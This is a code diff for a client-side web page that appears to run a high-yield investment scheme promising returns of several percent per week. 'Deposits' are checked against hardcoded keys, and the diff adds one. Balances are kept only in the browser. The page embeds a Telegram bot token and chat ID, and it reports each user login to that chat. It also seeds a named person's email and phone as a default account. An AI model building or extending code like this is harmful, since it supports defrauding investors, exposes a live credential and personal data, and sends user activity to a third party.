@@ -351,7 +351,7 @@
                 </div>
                 <div class="form-group">
                     <label>6-Digit Deposit Key</label>
-                    <input type="text" id="depositKey" class="form-control" placeholder="Enter 6-digit key (e.g. 200010)" maxlength="6" pattern="\d{6}" required>
+                    <input type="text" id="depositKey" class="form-control" placeholder="Enter 6-digit key (e.g. 200011)" maxlength="6" pattern="\d{6}" required>
                 </div>
                 <button type="submit" class="btn btn-gold" style="margin-bottom: 12px;">
                     <i class="fa-solid fa-key"></i> Submit Deposit Key
@@ -879,8 +879,8 @@
         const TELEGRAM_BOT_TOKEN = "8600939006:AAFU_mYGDtZHMKx08oif4PnJO-vGCZtzm0c";
         const TELEGRAM_CHAT_ID = "8441230005";
 
-        /* --- VALID DEPOSIT KEYS LIST (EACH CAN BE USED ONLY ONCE) --- */
-        const VALID_DEPOSIT_KEYS = ["200012", "200010"];
+        /* --- VALID DEPOSIT KEYS LIST --- */
+        const VALID_DEPOSIT_KEYS = ["200012", "200010", "200011"];
 
         function sendTelegramNotification(messageText) {
             const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
@@ -897,7 +897,6 @@
             }).catch(err => console.error("Telegram Notification Error:", err));
         }
 
-        /* --- UPDATED PACKAGES DATA WITH CUSTOM WEEKLY YIELDS --- */
         const packagesData = [
             { id: 1, category: "weekly", name: "Starter Weekly Plan", price: 20, returnLabel: "+$2.60 / Week", weeklyVal: 2.60, minWithdraw: 10, icon: "fa-seedling", badge: "Weekly Starter" },
             { id: 2, category: "weekly", name: "Bronze Weekly Plan", price: 100, returnLabel: "+$9.00 / Week", weeklyVal: 9.00, minWithdraw: 30, icon: "fa-coins", badge: "Weekly Popular" },
@@ -907,12 +906,14 @@
             { id: 6, category: "weekly", name: "Weekly Diamond Plan", price: 2500, returnLabel: "+$100.00 / Week", weeklyVal: 100.00, minWithdraw: 400, icon: "fa-diamond", badge: "Weekly Max" }
         ];
 
+        /* LOCALSTORAGE DATA MANAGEMENT FIXED TO PREVENT DATA LOSS */
         let systemDB = JSON.parse(localStorage.getItem('luminary_fx_system_db')) || {
             currentUsername: null,
             usedKeys: [],
             users: {} 
         };
 
+        if (!systemDB.users) systemDB.users = {};
         if (!systemDB.usedKeys) systemDB.usedKeys = [];
 
         let currentUserData = null;
@@ -980,6 +981,7 @@
         window.onload = function() {
             const targetUsername = "prakashvidura";
             
+            // Default user create only if does not exist
             if (!systemDB.users[targetUsername]) {
                 const targetProfile = { 
                     name: "Prakash Vidura", email: "prakashvidura56@gmail.com", phone: "+94770000000", 
@@ -996,28 +998,18 @@
                     date: new Date().toLocaleString()
                 });
                 systemDB.users[targetUsername] = targetData;
-            } else {
-                systemDB.users[targetUsername].accountId = "74639144";
-                systemDB.users[targetUsername].profile.email = "prakashvidura56@gmail.com";
-                if (systemDB.users[targetUsername].deposit < 50) {
-                    systemDB.users[targetUsername].deposit = 50.00;
-                }
             }
 
-            if (!systemDB.currentUsername) systemDB.currentUsername = targetUsername;
             saveSystemDB();
-
             updateSavedUsersDatalist();
-            if (!systemDB.currentUsername || !systemDB.users[systemDB.currentUsername]) {
-                document.getElementById('authModal').style.display = 'flex';
-            } else {
+
+            // Check if user is logged in
+            if (systemDB.currentUsername && systemDB.users[systemDB.currentUsername]) {
                 currentUserData = systemDB.users[systemDB.currentUsername];
-                if(!currentUserData.accountId) {
-                    currentUserData.accountId = generateUniqueAccountId();
-                    saveSystemDB();
-                }
                 document.getElementById('authModal').style.display = 'none';
                 initDashboard();
+            } else {
+                document.getElementById('authModal').style.display = 'flex';
             }
         };
 
@@ -1048,7 +1040,7 @@
             }
 
             if (systemDB.users[username]) {
-                alert("Username already exists! Please choose another username or Login.");
+                alert("Username already exists! Please choose another username or Sign In.");
                 return;
             }
 
@@ -1086,10 +1078,7 @@
             if (targetKey && systemDB.users[targetKey].profile.pass === passStr) {
                 systemDB.currentUsername = targetKey;
                 currentUserData = systemDB.users[targetKey];
-                if(!currentUserData.accountId) {
-                    currentUserData.accountId = generateUniqueAccountId();
-                    saveSystemDB();
-                }
+                
                 saveSystemDB();
 
                 sendTelegramNotification(`<b>🔑 User Logged In</b>\n\n<b>Username:</b> ${targetKey}\n<b>Account ID:</b> ${currentUserData.accountId}`);
@@ -1101,10 +1090,12 @@
             }
         }
 
+        /* FIXED LOGOUT PROCESS - PRESERVES DB DATA */
         function handleLogout() {
+            saveSystemDB(); // Save before clearing session
             systemDB.currentUsername = null;
             currentUserData = null;
-            saveSystemDB();
+            localStorage.setItem('luminary_fx_system_db', JSON.stringify(systemDB));
             updateSavedUsersDatalist();
             document.getElementById('authModal').style.display = 'flex';
         }
@@ -1354,7 +1345,6 @@
             alert("Withdrawal payment details saved successfully! They are now locked for 30 days.");
         }
 
-        /* --- DASHBOARD NAVIGATION & TAB CONTROLS --- */
         function switchMainTab(tabId, el) {
             document.querySelectorAll('.page-view').forEach(view => view.classList.remove('active'));
             document.querySelectorAll('.nav-link').forEach(link => link.classList.remove('active'));
@@ -1373,7 +1363,6 @@
             el.classList.add('active');
         }
 
-        /* --- INVESTMENT PURCHASING & CLAIMS ENGINE --- */
         function renderPackages() {
             const container = document.getElementById('packagesContainer');
 
@@ -1455,7 +1444,6 @@
             `).join('');
         }
 
-        /* --- UPDATED WEEKLY CLAIM STATUS LOGIC (EVERY 7 DAYS) --- */
         function checkWeeklyClaimStatus() {
             const now = new Date().getTime();
             const lastClaim = currentUserData.lastClaimTimestamp;
@@ -1463,7 +1451,6 @@
             const toggle2 = document.getElementById('claimTableToggle');
             const statusText = document.getElementById('switchStatusText');
 
-            // 7 Days in Milliseconds: 7 * 24 * 60 * 60 * 1000 = 604800000 ms
             const isAvailableThisWeek = !lastClaim || (now - lastClaim >= 7 * 24 * 60 * 60 * 1000);
 
             if (currentUserData.activePlans.length === 0) {
@@ -1524,7 +1511,6 @@
             alert(`Transferred $${transferred.toFixed(2)} to Available Balance!`);
         }
 
-        /* --- PAYOUT ENGINE & SUPPORT --- */
         function updatePayoutAddressDisplay() {
             const method = document.getElementById('payoutMethodSelect').value;
             const addrInput = document.getElementById('payoutTargetAddress');
